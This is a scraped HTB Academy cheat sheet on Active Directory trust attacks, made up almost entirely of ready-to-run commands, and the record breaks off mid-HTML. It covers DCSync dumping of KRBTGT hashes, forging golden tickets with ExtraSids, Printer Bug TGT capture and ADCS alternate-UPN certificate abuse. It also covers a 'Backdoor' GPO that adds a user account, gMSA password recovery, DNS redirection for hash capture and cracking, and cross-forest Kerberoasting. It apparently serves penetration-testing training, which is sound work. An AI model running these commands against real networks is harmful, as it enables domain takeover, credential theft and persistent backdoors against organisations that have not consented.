{"title": "Trust Attacks", "source": "htb-academy", "source_label": "HTB Academy", "path": "Active Directory/Trust Attacks", "html": "<h2 id=\"trust-enumeration-and-mapping\">Trust Enumeration and Mapping</h2>\n<p>Map trust relationships before attempting cross-domain or cross-forest attacks.</p>\n<h3 id=\"enumerate-trusts-ad-module\">Enumerate Trusts (AD Module)</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Import-Module</span> <span class=\"n\">activedirectory</span>\n<span class=\"nb\">Get-ADTrust</span> <span class=\"n\">-Filter</span> <span class=\"p\">*</span>\n</code></pre></div>\n<h3 id=\"enumerate-trusts-powerview\">Enumerate Trusts (PowerView)</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Get-DomainTrust</span>\n<span class=\"nb\">Get-DomainTrustMapping</span>\n</code></pre></div>\n<h3 id=\"map-trusts-with-adalanche\">Map Trusts with Adalanche</h3>\n<div class=\"highlight\"><pre><span></span><code>.\\Adalanche.exe collect activedirectory --domain &lt;domain&gt;\n</code></pre></div>\n<p>In the Adalanche GUI, use this query to view all trust relationships:</p>\n<div class=\"highlight\"><pre><span></span><code>(objectClass=trustedDomain)\n</code></pre></div>\n<hr />\n<h2 id=\"intra-forest-attacks-child-to-parent-escalation\">Intra-Forest Attacks (Child-to-Parent Escalation)</h2>\n<p>When you've compromised a child domain, use the ExtraSids attack to escalate to the parent domain.</p>\n<h3 id=\"obtain-child-domain-krbtgt-hash\">Obtain Child Domain KRBTGT Hash</h3>\n<p>Via Mimikatz DCSync:</p>\n<div class=\"highlight\"><pre><span></span><code><span class=\"p\">.\\</span><span class=\"n\">mimikatz</span><span class=\"p\">.</span><span class=\"n\">exe</span> <span class=\"s2\">&quot;lsadump::dcsync /user:&lt;child-domain&gt;\\krbtgt&quot;</span> <span class=\"n\">exit</span>\n</code></pre></div>\n<p>Via secretsdump.py:</p>\n<div class=\"highlight\"><pre><span></span><code>secretsdump.py<span class=\"w\"> </span>&lt;child-domain&gt;/Administrator:<span class=\"s1\">&#39;&lt;password&gt;&#39;</span>@&lt;child-dc-ip&gt;<span class=\"w\"> </span>-just-dc-user<span class=\"w\"> </span>&lt;CHILD-DOMAIN&gt;/krbtgt\n</code></pre></div>\n<h3 id=\"get-child-domain-sid\">Get Child Domain SID</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Get-DomainSID</span>\n</code></pre></div>\n<div class=\"highlight\"><pre><span></span><code>lookupsid.py<span class=\"w\"> </span>&lt;child-domain&gt;/Administrator:<span class=\"s1\">&#39;&lt;password&gt;&#39;</span>@&lt;child-dc-ip&gt;<span class=\"w\"> </span><span class=\"p\">|</span><span class=\"w\"> </span>grep<span class=\"w\"> </span><span class=\"s2\">&quot;Domain SID&quot;</span>\n</code></pre></div>\n<h3 id=\"get-enterprise-admins-group-sid-from-parent-domain\">Get Enterprise Admins Group SID from Parent Domain</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Get-ADGroup</span> <span class=\"n\">-Identity</span> <span class=\"s2\">&quot;Enterprise Admins&quot;</span> <span class=\"n\">-Server</span> <span class=\"s2\">&quot;&lt;parent-domain&gt;&quot;</span>\n</code></pre></div>\n<div class=\"highlight\"><pre><span></span><code>lookupsid.py<span class=\"w\"> </span>&lt;child-domain&gt;/Administrator:<span class=\"s1\">&#39;&lt;password&gt;&#39;</span>@&lt;parent-dc-ip&gt;<span class=\"w\"> </span><span class=\"p\">|</span><span class=\"w\"> </span>grep<span class=\"w\"> </span>-B12<span class=\"w\"> </span><span class=\"s2\">&quot;Enterprise Admins&quot;</span>\n</code></pre></div>\n<h3 id=\"forge-golden-ticket-with-extrasids-mimikatz\">Forge Golden Ticket with ExtraSids (Mimikatz)</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"n\">mimikatz</span> <span class=\"c\"># kerberos::golden /user:hacker /domain:&lt;child-domain&gt; /sid:&lt;child-domain-sid&gt; /krbtgt:&lt;krbtgt-hash&gt; /sids:&lt;enterprise-admins-sid&gt; /ptt</span>\n</code></pre></div>\n<h3 id=\"forge-golden-ticket-with-extrasids-rubeus\">Forge Golden Ticket with ExtraSids (Rubeus)</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"p\">.\\</span><span class=\"n\">Rubeus</span><span class=\"p\">.</span><span class=\"n\">exe</span> <span class=\"n\">golden</span> <span class=\"p\">/</span><span class=\"n\">rc4</span><span class=\"p\">:&lt;</span><span class=\"n\">krbtgt-hash</span><span class=\"p\">&gt;</span> <span class=\"p\">/</span><span class=\"n\">domain</span><span class=\"p\">:&lt;</span><span class=\"n\">child-domain</span><span class=\"p\">&gt;</span> <span class=\"p\">/</span><span class=\"n\">sid</span><span class=\"p\">:&lt;</span><span class=\"n\">child-domain-sid</span><span class=\"p\">&gt;</span> <span class=\"p\">/</span><span class=\"n\">sids</span><span class=\"p\">:&lt;</span><span class=\"n\">enterprise-admins-sid</span><span class=\"p\">&gt;</span> <span class=\"p\">/</span><span class=\"n\">user</span><span class=\"p\">:</span><span class=\"n\">hacker</span> <span class=\"p\">/</span><span class=\"n\">ptt</span>\n</code></pre></div>\n<h3 id=\"forge-golden-ticket-with-extrasids-ticketerpy\">Forge Golden Ticket with ExtraSids (ticketer.py)</h3>\n<div class=\"highlight\"><pre><span></span><code>ticketer.py<span class=\"w\"> </span>-nthash<span class=\"w\"> </span>&lt;krbtgt-hash&gt;<span class=\"w\"> </span>-domain<span class=\"w\"> </span>&lt;child-domain&gt;<span class=\"w\"> </span>-domain-sid<span class=\"w\"> </span>&lt;child-domain-sid&gt;<span class=\"w\"> </span>-extra-sid<span class=\"w\"> </span>&lt;enterprise-admins-sid&gt;<span class=\"w\"> </span>hacker\n<span class=\"nb\">export</span><span class=\"w\"> </span><span class=\"nv\">KRB5CCNAME</span><span class=\"o\">=</span>hacker.ccache\npsexec.py<span class=\"w\"> </span>&lt;child-domain&gt;/hacker@&lt;parent-dc-hostname&gt;.&lt;parent-domain&gt;<span class=\"w\"> </span>-k<span class=\"w\"> </span>-no-pass<span class=\"w\"> </span>-target-ip<span class=\"w\"> </span>&lt;parent-dc-ip&gt;\n</code></pre></div>\n<h3 id=\"automated-child-to-parent-escalation-raisechildpy\">Automated Child-to-Parent Escalation (raiseChild.py)</h3>\n<div class=\"highlight\"><pre><span></span><code>raiseChild.py<span class=\"w\"> </span>-target-exec<span class=\"w\"> </span>&lt;parent-dc-ip&gt;<span class=\"w\"> </span>&lt;child-domain&gt;/htb-student_adm\n</code></pre></div>\n<h3 id=\"access-parent-dc-after-forging-ticket\">Access Parent DC After Forging Ticket</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">ls </span><span class=\"p\">\\\\&lt;</span><span class=\"n\">parent-dc-hostname</span><span class=\"p\">&gt;.&lt;</span><span class=\"n\">parent-domain</span><span class=\"p\">&gt;\\</span><span class=\"n\">c</span><span class=\"p\">$</span>\n<span class=\"n\">mimikatz</span> <span class=\"c\"># lsadump::dcsync /user:&lt;DOMAIN&gt;\\lab_adm</span>\n</code></pre></div>\n<hr />\n<h2 id=\"printer-bug-unconstrained-delegation-coercion\">Printer Bug / Unconstrained Delegation Coercion</h2>\n<p>Force a DC to authenticate to a host you control that has unconstrained delegation enabled, capturing its TGT.</p>\n<h3 id=\"monitor-for-tgts-with-rubeus\">Monitor for TGTs with Rubeus</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"p\">.\\</span><span class=\"n\">Rubeus</span><span class=\"p\">.</span><span class=\"n\">exe</span> <span class=\"n\">monitor</span> <span class=\"p\">/</span><span class=\"n\">interval</span><span class=\"p\">:</span><span class=\"n\">5</span> <span class=\"p\">/</span><span class=\"n\">nowrap</span>\n</code></pre></div>\n<h3 id=\"trigger-printer-bug-spoolsample\">Trigger Printer Bug (SpoolSample)</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"p\">.\\</span><span class=\"n\">SpoolSample</span><span class=\"p\">.</span><span class=\"n\">exe</span> <span class=\"p\">&lt;</span><span class=\"n\">target-dc-hostname</span><span class=\"p\">&gt;.&lt;</span><span class=\"n\">domain</span><span class=\"p\">&gt;</span> <span class=\"p\">&lt;</span><span class=\"n\">unconstrained-host</span><span class=\"p\">&gt;.&lt;</span><span class=\"n\">domain</span><span class=\"p\">&gt;</span>\n</code></pre></div>\n<h3 id=\"renew-captured-tgt\">Renew Captured TGT</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"p\">.\\</span><span class=\"n\">Rubeus</span><span class=\"p\">.</span><span class=\"n\">exe</span> <span class=\"n\">renew</span> <span class=\"p\">/</span><span class=\"n\">ticket</span><span class=\"p\">:&lt;</span><span class=\"n\">base64-ticket</span><span class=\"p\">&gt;</span> <span class=\"p\">/</span><span class=\"n\">ptt</span>\n</code></pre></div>\n<hr />\n<h2 id=\"acl-abuse-on-configuration-naming-context\">ACL Abuse on Configuration Naming Context</h2>\n<p>If you have write rights over the Configuration NC, you can escalate forest-wide.</p>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nv\">$dn</span> <span class=\"p\">=</span> <span class=\"s2\">&quot;CN=Configuration,DC=&lt;DOMAIN&gt;,DC=AD&quot;</span>\n<span class=\"nv\">$acl</span> <span class=\"p\">=</span> <span class=\"nb\">Get-Acl</span> <span class=\"n\">-Path</span> <span class=\"s2\">&quot;AD:\\$dn&quot;</span>\n<span class=\"nv\">$acl</span><span class=\"p\">.</span><span class=\"n\">Access</span> <span class=\"p\">|</span> <span class=\"nb\">Where-Object</span> <span class=\"p\">{</span><span class=\"nv\">$_</span><span class=\"p\">.</span><span class=\"n\">ActiveDirectoryRights</span> <span class=\"o\">-match</span> <span class=\"s2\">&quot;GenericAll|Write&quot;</span><span class=\"p\">}</span>\n</code></pre></div>\n<hr />\n<h2 id=\"certificate-based-privilege-escalation-adcs\">Certificate-Based Privilege Escalation (ADCS)</h2>\n<h3 id=\"request-certificate-with-alternate-upn\">Request Certificate with Alternate UPN</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"p\">.\\</span><span class=\"n\">Certify</span><span class=\"p\">.</span><span class=\"n\">exe</span> <span class=\"n\">request</span> <span class=\"p\">/</span><span class=\"n\">ca</span><span class=\"p\">:&lt;</span><span class=\"n\">domain</span><span class=\"p\">&gt;\\&lt;</span><span class=\"n\">CA-name</span><span class=\"p\">&gt;</span> <span class=\"p\">/</span><span class=\"n\">domain</span><span class=\"p\">:&lt;</span><span class=\"n\">domain</span><span class=\"p\">&gt;</span> <span class=\"p\">/</span><span class=\"n\">template</span><span class=\"p\">:</span><span class=\"s2\">&quot;Copy of User&quot;</span> <span class=\"p\">/</span><span class=\"n\">altname</span><span class=\"p\">:&lt;</span><span class=\"n\">DOMAIN</span><span class=\"p\">&gt;\\</span><span class=\"n\">Administrator</span>\n<span class=\"p\">.\\</span><span class=\"n\">Rubeus</span><span class=\"p\">.</span><span class=\"n\">exe</span> <span class=\"n\">asktgt</span> <span class=\"p\">/</span><span class=\"n\">domain</span><span class=\"p\">:&lt;</span><span class=\"n\">domain</span><span class=\"p\">&gt;</span> <span class=\"p\">/</span><span class=\"n\">user</span><span class=\"p\">:</span><span class=\"n\">Administrator</span> <span class=\"p\">/</span><span class=\"n\">certificate</span><span class=\"p\">:</span><span class=\"n\">cert</span><span class=\"p\">.</span><span class=\"n\">pfx</span> <span class=\"p\">/</span><span class=\"n\">ptt</span>\n</code></pre></div>\n<hr />\n<h2 id=\"gpo-abuse-from-child-domain\">GPO Abuse from Child Domain</h2>\n<h3 id=\"create-and-link-gpo-as-system\">Create and Link GPO as SYSTEM</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nv\">$gpo</span> <span class=\"p\">=</span> <span class=\"s2\">&quot;Backdoor&quot;</span>\n<span class=\"nb\">New-GPO</span> <span class=\"nv\">$gpo</span>\n<span class=\"nb\">New-GPOImmediateTask</span> <span class=\"n\">-Verbose</span> <span class=\"n\">-Force</span> <span class=\"n\">-TaskName</span> <span class=\"s1\">&#39;Backdoor&#39;</span> <span class=\"n\">-GPODisplayName</span> <span class=\"s2\">&quot;Backdoor&quot;</span> <span class=\"n\">-Command</span> <span class=\"n\">C</span><span class=\"p\">:\\</span><span class=\"n\">Windows</span><span class=\"p\">\\</span><span class=\"n\">System32</span><span class=\"p\">\\</span><span class=\"n\">cmd</span><span class=\"p\">.</span><span class=\"n\">exe</span> <span class=\"n\">-CommandArguments</span> <span class=\"s2\">&quot;/c net user backdoor B@ckdoor123 /add&quot;</span>\n<span class=\"nb\">Get-ADDomainController</span> <span class=\"n\">-Server</span> <span class=\"p\">&lt;</span><span class=\"n\">parent-domain</span><span class=\"p\">&gt;</span> <span class=\"p\">|</span> <span class=\"nb\">Select </span><span class=\"n\">ServerObjectDN</span>\n<span class=\"nv\">$sitePath</span> <span class=\"p\">=</span> <span class=\"s2\">&quot;CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=&lt;DOMAIN&gt;,DC=AD&quot;</span>\n<span class=\"nb\">New-GPLink</span> <span class=\"n\">-Name</span> <span class=\"s2\">&quot;Backdoor&quot;</span> <span class=\"n\">-Target</span> <span class=\"nv\">$sitePath</span> <span class=\"n\">-Server</span> <span class=\"p\">&lt;</span><span class=\"n\">child-domain</span><span class=\"p\">&gt;</span>\n</code></pre></div>\n<hr />\n<h2 id=\"gmsa-attacks\">gMSA Attacks</h2>\n<p>Group Managed Service Account password recovery from the parent domain.</p>\n<h3 id=\"enumerate-gmsa-accounts\">Enumerate gMSA Accounts</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"p\">.\\</span><span class=\"n\">GoldenGMSA</span><span class=\"p\">.</span><span class=\"n\">exe</span> <span class=\"n\">gmsainfo</span> <span class=\"p\">-</span><span class=\"n\">-domain</span> <span class=\"p\">&lt;</span><span class=\"n\">domain</span><span class=\"p\">&gt;</span>\n</code></pre></div>\n<h3 id=\"retrieve-msds-managedpasswordid\">Retrieve msds-ManagedPasswordID</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"p\">.\\</span><span class=\"n\">GoldenGMSA</span><span class=\"p\">.</span><span class=\"n\">exe</span> <span class=\"n\">gmsainfo</span> <span class=\"p\">-</span><span class=\"n\">-domain</span> <span class=\"p\">&lt;</span><span class=\"n\">domain</span><span class=\"p\">&gt;</span>\n</code></pre></div>\n<h3 id=\"retrieve-kds-root-key-info\">Retrieve KDS Root Key Info</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"p\">.\\</span><span class=\"n\">GoldenGMSA</span><span class=\"p\">.</span><span class=\"n\">exe</span> <span class=\"n\">kdsinfo</span> <span class=\"p\">-</span><span class=\"n\">-forest</span> <span class=\"p\">&lt;</span><span class=\"n\">child-domain</span><span class=\"p\">&gt;</span>\n</code></pre></div>\n<h3 id=\"compute-gmsa-password\">Compute gMSA Password</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"p\">.\\</span><span class=\"n\">GoldenGMSA</span><span class=\"p\">.</span><span class=\"n\">exe</span> <span class=\"n\">compute</span> <span class=\"p\">-</span><span class=\"n\">-sid</span> <span class=\"s2\">&quot;&lt;account-sid&gt;&quot;</span> <span class=\"p\">-</span><span class=\"n\">-forest</span> <span class=\"p\">&lt;</span><span class=\"n\">child-domain</span><span class=\"p\">&gt;</span> <span class=\"p\">-</span><span class=\"n\">-domain</span> <span class=\"p\">&lt;</span><span class=\"n\">domain</span><span class=\"p\">&gt;</span>\n<span class=\"p\">.\\</span><span class=\"n\">GoldenGMSA</span><span class=\"p\">.</span><span class=\"n\">exe</span> <span class=\"n\">compute</span> <span class=\"p\">-</span><span class=\"n\">-sid</span> <span class=\"s2\">&quot;&lt;account-sid&gt;&quot;</span> <span class=\"p\">-</span><span class=\"n\">-kdskey</span> <span class=\"n\">AQAAAAwsk</span><span class=\"p\">&lt;...&gt;</span>\n</code></pre></div>\n<h3 id=\"convert-password-to-nt-hash-python\">Convert Password to NT Hash (Python)</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"kn\">import</span> <span class=\"nn\">base64</span>\n<span class=\"kn\">import</span> <span class=\"nn\">hashlib</span>\n<span class=\"n\">base64_input</span> <span class=\"o\">=</span> <span class=\"s2\">&quot;&lt;base64-managed-password&gt;&quot;</span>\n<span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"n\">hashlib</span><span class=\"o\">.</span><span class=\"n\">new</span><span class=\"p\">(</span><span class=\"s2\">&quot;md4&quot;</span><span class=\"p\">,</span> <span class=\"n\">base64</span><span class=\"o\">.</span><span class=\"n\">b64decode</span><span class=\"p\">(</span><span class=\"n\">base64_input</span><span class=\"p\">))</span><span class=\"o\">.</span><span class=\"n\">hexdigest</span><span class=\"p\">())</span>\n</code></pre></div>\n<hr />\n<h2 id=\"dns-abuse-for-intra-forest-lateral-movement\">DNS Abuse for Intra-Forest Lateral Movement</h2>\n<h3 id=\"add-wildcard-dns-record-powermad\">Add Wildcard DNS Record (Powermad)</h3>\n<p>Forces all DNS lookups for non-existent hosts in the zone to resolve to your IP for hash capture.</p>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Import-Module</span> <span class=\"n\">Powermad</span><span class=\"p\">.</span><span class=\"n\">ps1</span>\n<span class=\"nb\">New-ADIDNSNode</span> <span class=\"n\">-Node</span> <span class=\"p\">*</span> <span class=\"n\">-domainController</span> <span class=\"p\">&lt;</span><span class=\"n\">dc-hostname</span><span class=\"p\">&gt;.&lt;</span><span class=\"n\">domain</span><span class=\"p\">&gt;</span> <span class=\"n\">-Domain</span> <span class=\"p\">&lt;</span><span class=\"n\">domain</span><span class=\"p\">&gt;</span> <span class=\"n\">-Zone</span> <span class=\"p\">&lt;</span><span class=\"n\">domain</span><span class=\"p\">&gt;</span> <span class=\"n\">-Tombstone</span> <span class=\"n\">-Verbose</span>\n</code></pre></div>\n<h3 id=\"enumerate-dns-records\">Enumerate DNS Records</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Get-DnsServerResourceRecord</span> <span class=\"n\">-ComputerName</span> <span class=\"p\">&lt;</span><span class=\"n\">dc-hostname</span><span class=\"p\">&gt;.&lt;</span><span class=\"n\">domain</span><span class=\"p\">&gt;</span> <span class=\"n\">-ZoneName</span> <span class=\"p\">&lt;</span><span class=\"n\">domain</span><span class=\"p\">&gt;</span> <span class=\"n\">-Name</span> <span class=\"s2\">&quot;@&quot;</span>\n<span class=\"nb\">Resolve-DnsName</span> <span class=\"n\">-Name</span> <span class=\"p\">&lt;</span><span class=\"n\">dev-server</span><span class=\"p\">&gt;.&lt;</span><span class=\"n\">domain</span><span class=\"p\">&gt;</span> <span class=\"n\">-Server</span> <span class=\"p\">&lt;</span><span class=\"n\">dc-hostname</span><span class=\"p\">&gt;.&lt;</span><span class=\"n\">DOMAIN</span><span class=\"p\">&gt;</span>\n</code></pre></div>\n<h3 id=\"modify-a-dns-record-redirect-traffic\">Modify a DNS Record (Redirect Traffic)</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nv\">$Old</span> <span class=\"p\">=</span> <span class=\"nb\">Get-DnsServerResourceRecord</span> <span class=\"n\">-ComputerName</span> <span class=\"p\">&lt;</span><span class=\"n\">dc-hostname</span><span class=\"p\">&gt;.&lt;</span><span class=\"n\">DOMAIN</span><span class=\"p\">&gt;</span> <span class=\"n\">-ZoneName</span> <span class=\"p\">&lt;</span><span class=\"n\">domain</span><span class=\"p\">&gt;</span> <span class=\"n\">-Name</span> <span class=\"p\">&lt;</span><span class=\"n\">dev-server</span><span class=\"p\">&gt;</span>\n<span class=\"nv\">$New</span> <span class=\"p\">=</span> <span class=\"nv\">$Old</span><span class=\"p\">.</span><span class=\"n\">Clone</span><span class=\"p\">()</span>\n<span class=\"nv\">$TTL</span> <span class=\"p\">=</span> <span class=\"no\">[System.TimeSpan]</span><span class=\"p\">::</span><span class=\"n\">FromSeconds</span><span class=\"p\">(</span><span class=\"n\">1</span><span class=\"p\">)</span>\n<span class=\"nv\">$New</span><span class=\"p\">.</span><span class=\"n\">TimeToLive</span> <span class=\"p\">=</span> <span class=\"nv\">$TTL</span>\n<span class=\"nv\">$New</span><span class=\"p\">.</span><span class=\"n\">RecordData</span><span class=\"p\">.</span><span class=\"n\">IPv4Address</span> <span class=\"p\">=</span> <span class=\"no\">[System.Net.IPAddress]</span><span class=\"p\">::</span><span class=\"n\">parse</span><span class=\"p\">(</span><span class=\"s1\">&#39;&lt;attacker-ip&gt;&#39;</span><span class=\"p\">)</span>\n<span class=\"nb\">Set-DnsServerResourceRecord</span> <span class=\"n\">-NewInputObject</span> <span class=\"nv\">$New</span> <span class=\"n\">-OldInputObject</span> <span class=\"nv\">$Old</span> <span class=\"n\">-ComputerName</span> <span class=\"p\">&lt;</span><span class=\"n\">dc-hostname</span><span class=\"p\">&gt;.&lt;</span><span class=\"n\">DOMAIN</span><span class=\"p\">&gt;</span> <span class=\"n\">-ZoneName</span> <span class=\"p\">&lt;</span><span class=\"n\">domain</span><span class=\"p\">&gt;</span>\n</code></pre></div>\n<h3 id=\"start-inveigh-for-hash-capture\">Start Inveigh for Hash Capture</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Invoke-Inveigh</span> <span class=\"n\">Y</span> <span class=\"n\">-NBNS</span> <span class=\"n\">Y</span> <span class=\"n\">-ConsoleOutput</span> <span class=\"n\">Y</span> <span class=\"n\">-FileOutput</span> <span class=\"n\">Y</span> <span class=\"n\">-SMB</span> <span class=\"n\">Y</span>\n<span class=\"n\">hashcat</span> <span class=\"n\">-m</span> <span class=\"n\">5600</span> <span class=\"p\">&lt;</span><span class=\"n\">hash</span><span class=\"o\">-file</span><span class=\"p\">&gt;</span> <span class=\"p\">/</span><span class=\"n\">usr</span><span class=\"p\">/</span><span class=\"n\">share</span><span class=\"p\">/</span><span class=\"n\">wordlists</span><span class=\"p\">/</span><span class=\"n\">rockyou</span><span class=\"p\">.</span><span class=\"n\">txt</span>\n</code></pre></div>\n<hr />\n<h2 id=\"cross-forest-foreign-user-and-acl-enumeration\">Cross-Forest Foreign User and ACL Enumeration</h2>\n<h3 id=\"enumerate-foreign-users\">Enumerate Foreign Users</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Get-DomainForeignUser</span>\n<span class=\"nb\">Get-DomainGroup</span> <span class=\"n\">-Identity</span> <span class=\"s1\">&#39;&lt;group&gt;&#39;</span> <span class=\"n\">-domain</span> <span class=\"p\">&lt;</span><span class=\"n\">parent-domain</span><span class=\"p\">&gt;</span>\n</code></pre></div>\n<h3 id=\"create-sacrificial-logon-session\">Create Sacrificial Logon Session</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"p\">./</span><span class=\"n\">Rubeus</span> <span class=\"n\">createnetonly</span> <span class=\"p\">/</span><span class=\"n\">program</span><span class=\"p\">:</span><span class=\"n\">powershell</span><span class=\"p\">.</span><span class=\"n\">exe</span> <span class=\"p\">/</span><span class=\"n\">show</span>\n</code></pre></div>\n<h3 id=\"create-new-user-in-parent-domain\">Create New User in Parent Domain</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Import-Module</span> <span class=\"p\">.\\</span><span class=\"n\">PowerView</span><span class=\"p\">.</span><span class=\"n\">ps1</span>\n<span class=\"nv\">$SecPassword</span> <span class=\"p\">=</span> <span class=\"nb\">ConvertTo-SecureString</span> <span class=\"s1\">&#39;&lt;password&gt;&#39;</span> <span class=\"n\">-AsPlainText</span> <span class=\"n\">-Force</span>\n<span class=\"nb\">New-DomainUser</span> <span class=\"n\">-Domain</span> <span class=\"p\">&lt;</span><span class=\"n\">parent-domain</span><span class=\"p\">&gt;</span> <span class=\"n\">-SamAccountName</span> <span class=\"p\">&lt;</span><span class=\"n\">newuser</span><span class=\"p\">&gt;</span> <span class=\"n\">-AccountPassword</span> <span class=\"nv\">$SecPassword</span>\n<span class=\"nb\">Add-ADGroupMember</span> <span class=\"n\">-identity</span> <span class=\"s2\">&quot;DNSAdmins&quot;</span> <span class=\"n\">-Members</span> <span class=\"p\">&lt;</span><span class=\"n\">newuser</span><span class=\"p\">&gt;</span> <span class=\"n\">-Server</span> <span class=\"p\">&lt;</span><span class=\"n\">parent-domain</span><span class=\"p\">&gt;</span>\n</code></pre></div>\n<h3 id=\"enumerate-foreign-acls\">Enumerate Foreign ACLs</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nv\">$sid</span> <span class=\"p\">=</span> <span class=\"nb\">Convert-NameToSid</span> <span class=\"p\">&lt;</span><span class=\"n\">username</span><span class=\"p\">&gt;</span>\n<span class=\"nb\">Get-DomainObjectAcl</span> <span class=\"n\">-ResolveGUIDs</span> <span class=\"n\">-Identity</span> <span class=\"p\">*</span> <span class=\"n\">-domain</span> <span class=\"p\">&lt;</span><span class=\"n\">parent-domain</span><span class=\"p\">&gt;</span> <span class=\"p\">|</span> <span class=\"p\">?</span> <span class=\"p\">{</span><span class=\"nv\">$_</span><span class=\"p\">.</span><span class=\"n\">SecurityIdentifier</span> <span class=\"o\">-eq</span> <span class=\"nv\">$sid</span><span class=\"p\">}</span>\n</code></pre></div>\n<h3 id=\"add-foreign-user-to-group-in-parent-domain\">Add Foreign User to Group in Parent Domain</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Add-DomainGroupMember</span> <span class=\"n\">-identity</span> <span class=\"s1\">&#39;Infrastructure&#39;</span> <span class=\"n\">-Members</span> <span class=\"s1\">&#39;&lt;child-domain&gt;\\&lt;username&gt;&#39;</span> <span class=\"n\">-Domain</span> <span class=\"p\">&lt;</span><span class=\"n\">parent-domain</span><span class=\"p\">&gt;</span> <span class=\"n\">-Verbose</span>\n<span class=\"nb\">Get-DomainGroupMember</span> <span class=\"n\">-Identity</span> <span class=\"s1\">&#39;Infrastructure&#39;</span> <span class=\"n\">-Domain</span> <span class=\"p\">&lt;</span><span class=\"n\">parent-domain</span><span class=\"p\">&gt;</span> <span class=\"n\">-Verbose</span>\n</code></pre></div>\n<h3 id=\"enumerate-all-foreign-acls\">Enumerate All Foreign ACLs</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nv\">$Domain</span> <span class=\"p\">=</span> <span class=\"s2\">&quot;&lt;parent-domain&gt;&quot;</span>\n<span class=\"nv\">$DomainSid</span> <span class=\"p\">=</span> <span class=\"nb\">Get-DomainSid</span> <span class=\"nv\">$Domain</span>\n<span class=\"nb\">Get-DomainObjectAcl</span> <span class=\"n\">-Domain</span> <span class=\"nv\">$Domain</span> <span class=\"n\">-ResolveGUIDs</span> <span class=\"n\">-Identity</span> <span class=\"p\">*</span> <span class=\"p\">|</span> <span class=\"p\">?</span> <span class=\"p\">{</span>\n    <span class=\"p\">(</span><span class=\"nv\">$_</span><span class=\"p\">.</span><span class=\"n\">ActiveDirectoryRights</span> <span class=\"o\">-match</span> <span class=\"s1\">&#39;WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner&#39;</span><span class=\"p\">)</span> <span class=\"o\">-and</span>\n    <span class=\"p\">(</span><span class=\"nv\">$_</span><span class=\"p\">.</span><span class=\"n\">AceType</span> <span class=\"o\">-match</span> <span class=\"s1\">&#39;AccessAllowed&#39;</span><span class=\"p\">)</span> <span class=\"o\">-and</span>\n    <span class=\"p\">(</span><span class=\"nv\">$_</span><span class=\"p\">.</span><span class=\"n\">SecurityIdentifier</span> <span class=\"o\">-match</span> <span class=\"s1\">&#39;^S-1-5-.*-[1-9]\\d{3,}$&#39;</span><span class=\"p\">)</span> <span class=\"o\">-and</span>\n    <span class=\"p\">(</span><span class=\"nv\">$_</span><span class=\"p\">.</span><span class=\"n\">SecurityIdentifier</span> <span class=\"o\">-notmatch</span> <span class=\"nv\">$DomainSid</span><span class=\"p\">)</span>\n<span class=\"p\">}</span>\n<span class=\"nb\">ConvertFrom-SID</span> <span class=\"n\">S</span><span class=\"p\">-</span><span class=\"n\">1</span><span class=\"p\">-</span><span class=\"n\">5</span><span class=\"p\">-</span><span class=\"n\">21</span><span class=\"p\">-...</span>\n</code></pre></div>\n<hr />\n<h2 id=\"cross-forest-attacks\">Cross-Forest Attacks</h2>\n<h3 id=\"kerberoast-across-forest-trust\">Kerberoast Across Forest Trust</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"p\">.\\</span><span class=\"n\">Rubeus</span><span class=\"p\">.</span><span class=\"n\">exe</span> <span class=\"n\">kerberoast</span> <span class=\"p\">/</span><span class=\"n\">domain</span><span class=\"p\">:&lt;</span><span class=\"n\">external-domain</span><span class=\"p\">&gt;</span>\n</code></pre></div>\n<div class=\"highlight\"><pre><span></span><code>GetUserSPNs.py<span class=\"w\"> </span>-request<span class=\"w\"> </span>-target-domain<span class=\"w\"> </span>&lt;external-domain&gt;<span class=\"w\"> </span>&lt;DOMAIN&gt;/&lt;username&gt;\n</code></pre></div>\n<h3 id=\"enumerate-users-with-sidhistory\">Enumerate Users with SIDHistory</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Get-ADUser</span> <span class=\"n\">-Filter</span> <span class=\"s2\">&quot;SIDHistory -Like &#39;*&#39;&quot;</span> <span class=\"n\">-Properties</span> <span class=\"n\">SIDHistory</span>\n</code></pre></div>\n<h3 id=\"get-trust-attributes\">Get Trust Attributes</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Get-DomainTrust</span> <span class=\"n\">-domain</span> <span class=\"p\">&lt;</span><span class=\"n\">external-domain</span><span class=\"p\">&gt;</span> <span class=\"p\">|</span> <span class=\"nb\">Where-Object</span> <span class=\"p\">{</span><span class=\"nv\">$_</span><span class=\"p\">.</span><span class=\"n\">TargetName</span> <span class=\"o\">-eq</span> <span 